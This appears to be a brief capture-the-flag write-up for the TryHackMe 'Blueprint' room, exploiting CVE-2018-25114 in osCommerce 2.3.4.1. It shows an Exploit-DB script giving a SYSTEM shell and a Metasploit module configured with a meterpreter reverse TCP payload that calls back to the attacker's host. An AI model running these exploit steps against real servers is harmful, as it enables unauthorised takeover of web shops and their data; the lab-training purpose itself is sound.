## CVE-2018-25114
Description  
A remote code execution vulnerability exists within osCommerce Online Merchant version 2.3.4.1 due to insecure default configuration and missing authentication in the installer workflow. By default, the /install/ directory remains accessible after installation. An unauthenticated attacker can invoke install_4.php, submit crafted POST data, and inject arbitrary PHP code into the configure.php file. When the application later includes this file, the injected payload is executed, resulting in full server-side compromise.

## get shell

### 方法1 searchsploit
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ searchsploit oscommerce 2.3.4        
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities              | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection            | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection         | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection          | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scrip | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload               | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution               | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)           | php/webapps/50128.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```bash          
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

### 方法2 msfconsle
```bash
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting           Required  Description
   ----     ---------------           --------  -----------
   Proxies                            no        A proxy chain of format type:host:port[,t
                                                ype:host:port][...]. Supported proxies: s
                                                apni, socks4, socks5, socks5h, http
   RHOSTS   blueprint.thm             yes       The target host(s), see https://docs.meta
                                                sploit.com/docs/using-metasploit/basics/u
                                                sing-metasploit.html
   RPORT    8080                      yes       The target port (TCP)
   SSL      false                     no        Negotiate SSL/TLS for outgoing connection
                                                s
   URI      /oscommerce-2.3.4/catalo  yes       The path to the install directory
            g/install/
   VHOST                              no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.4.11.38       yes       The listen address (an interface may be specified)
   LPORT  444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

meterpreter > getuid
Server username: SYSTEM

```


## 參考
- https://nvd.nist.gov/vuln/detail/CVE-2018-25114
- https://tryhackme.com/room/blueprint